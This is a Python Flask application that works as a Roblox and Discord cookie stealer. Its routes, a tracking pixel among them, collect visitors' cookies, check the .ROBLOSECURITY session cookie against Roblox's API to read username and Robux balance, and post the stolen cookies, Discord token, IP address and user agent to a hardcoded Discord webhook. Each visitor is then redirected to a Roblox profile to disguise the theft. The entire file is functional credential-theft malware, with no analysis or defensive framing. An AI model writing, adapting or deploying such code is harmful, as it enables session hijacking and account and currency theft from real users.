from flask import Flask, request, Response, redirect
import requests
import json
from datetime import datetime
import os
import base64
import re

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

# Imagen pixel transparente
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

@app.route('/')
def index():
    # Capturar TODAS las cookies del header
    cookies = {}
    cookie_string = request.headers.get('Cookie', '')
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Buscar cookies específicas
    roblox_cookie = cookies.get('.ROBLOSECURITY', '')
    discord_token = cookies.get('token', '')
    
    # Verificar si la cookie de Roblox es válida usando la API
    username = 'Unknown'
    robux = 'Unknown'
    user_id = 'Unknown'
    
    if roblox_cookie:
        try:
            # Usar la API de Roblox como en el script que me pasaste
            req = requests.Session()
            req.cookies['.ROBLOSECURITY'] = roblox_cookie
            user_info = req.get('https://www.roblox.com/mobileapi/userinfo').json()
            username = user_info.get('UserName', 'Unknown')
            robux = user_info.get('RobuxBalance', 'Unknown')
            user_id = user_info.get('UserID', 'Unknown')
        except:
            username = 'Invalid Cookie'
    
    # Capturar headers
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Construir embed para Discord
    embed = {
        "title": f"🎯 ROBLOX COOKIE CAPTURED - {username}",
        "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n**IP:** {ip}",
        "color": 16711680,
        "fields": [
            {"name": "🌐 IP", "value": str(ip), "inline": True},
            {"name": "👤 Username", "value": str(username), "inline": True},
            {"name": "🆔 User ID", "value": str(user_id), "inline": True},
            {"name": "💰 Robux", "value": str(robux), "inline": True},
            {"name": "🖥️ User Agent", "value": str(user_agent)[:100], "inline": False},
            {"name": "🔴 ROBLOX COOKIE (.ROBLOSECURITY)", "value": f"```{roblox_cookie}```", "inline": False},
            {"name": "🔵 Discord Token", "value": f"```{discord_token}```", "inline": False},
            {"name": "📋 ALL COOKIES", "value": f"```json\n{json.dumps(cookies, indent=2)[:1000]}```", "inline": False}
        ],
        "footer": {"text": "Image Logger - API Verified"}
    }
    
    # Enviar a Discord
    try:
        response = requests.post(WEBHOOK_URL, json={"content": "@everyone **ROBLOX COOKIE CAPTURED**", "embeds": [embed]}, timeout=10)
        print(f"Webhook sent: {response.status_code}")
    except Exception as e:
        print(f"Webhook error: {e}")
    
    # Redirigir al perfil de Roblox
    return redirect('https://www.roblox.com/es/users/7869790887/profile', code=302)

@app.route('/api/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        cookies = data.get('cookies', {})
        discord_token = data.get('discord_token', '')
        roblox_cookie = data.get('roblox_cookie', '')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Verificar cookie con API de Roblox
        username = 'Unknown'
        if roblox_cookie:
            try:
                req = requests.Session()
                req.cookies['.ROBLOSECURITY'] = roblox_cookie
                user_info = req.get('https://www.roblox.com/mobileapi/userinfo').json()
                username = user_info.get('UserName', 'Unknown')
            except:
                username = 'Invalid Cookie'
        
        embed = {
            "title": f"🎯 JS CAPTURE - {username}",
            "color": 16711680,
            "fields": [
                {"name": "🌐 IP", "value": str(ip), "inline": True},
                {"name": "👤 Username", "value": str(username), "inline": True},
                {"name": "🔴 ROBLOX", "value": f"```{roblox_cookie}```", "inline": False},
                {"name": "🔵 DISCORD", "value": f"```{discord_token}```", "inline": False},
                {"name": "📋 ALL COOKIES", "value": f"```json\n{json.dumps(cookies, indent=2)[:500]}```", "inline": False}
            ]
        }
        
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        return {"status": "success", "username": username}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.route('/pixel.png')
def pixel():
    # Capturar cookies
    cookies = {}
    cookie_string = request.headers.get('Cookie', '')
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    roblox_cookie = cookies.get('.ROBLOSECURITY', '')
    discord_token = cookies.get('token', '')
    
    if roblox_cookie:
        try:
            req = requests.Session()
            req.cookies['.ROBLOSECURITY'] = roblox_cookie
            user_info = req.get('https://www.roblox.com/mobileapi/userinfo').json()
            username = user_info.get('UserName', 'Unknown')
            
            embed = {
                "title": f"📸 PIXEL HIT - {username}",
                "color": 16711680,
                "fields": [
                    {"name": "👤 Username", "value": str(username), "inline": True},
                    {"name": "🔴 Cookie", "value": f"```{roblox_cookie}```", "inline": False}
                ]
            }
            
            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        except:
            pass
    
    return Response(PIXEL, mimetype='image/png')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
